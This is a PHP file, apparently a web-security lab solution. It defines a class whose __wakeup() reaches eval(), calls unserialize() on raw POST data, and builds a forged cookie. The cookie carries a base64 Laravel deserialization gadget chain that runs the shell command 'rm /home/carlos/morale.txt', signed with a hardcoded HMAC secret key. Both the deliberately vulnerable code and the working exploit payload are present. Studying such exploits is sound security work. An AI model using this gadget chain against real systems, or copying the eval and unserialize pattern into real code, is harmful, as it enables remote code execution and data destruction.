<?php
class Example
{
    private $obj;
    function __construct(){
        // some PHP code...
    }
    function __wakeup(){
        if(isset($this->obj)){
            return $this->obj->evaluate();
        }
    }
}

class CodeSnippet
{
    private $code;
    function evaluate(){
        eval($this->code);
    }
}
// some PHP code...
$user_data = unserialize($_POST['data']);

$object = 'Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6NDoiZXhlYyI7fX1zOjg6IgAqAGV2ZW50IjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQo=';
$secretKey = "lvyp4jgtn0mdtt3wr42bzznprkwiwhn6";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
// some PHP code.. f7187a92747bf5d1f6f920a70eb1384c628cef13
?>